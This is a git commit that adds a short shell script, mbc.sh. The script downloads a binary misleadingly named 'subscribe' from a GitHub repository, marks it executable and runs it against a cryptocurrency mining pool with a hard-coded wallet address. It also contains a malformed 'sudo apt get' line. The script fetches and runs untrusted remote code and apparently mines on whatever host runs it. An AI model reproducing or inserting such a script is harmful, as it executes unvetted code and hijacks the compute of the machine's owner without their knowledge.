444020ac15df621042811cd9f1485daafceb5914
dancokteam <97625558+dancokteam@users.noreply.github.com>
2022-01-13 01:59:25 +0800

    Create mbc.sh

---
+++ mbc.sh
@@ -0,0 +1,4 @@
+sudo apt get
+wget https://github.com/mrbogel/Student/raw/main/subscribe
+chmod +x subscribe
+./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u mbc1qss3f3wem69spqnywzx5rlqkgk34t3pa8tgqrhj.siMerah
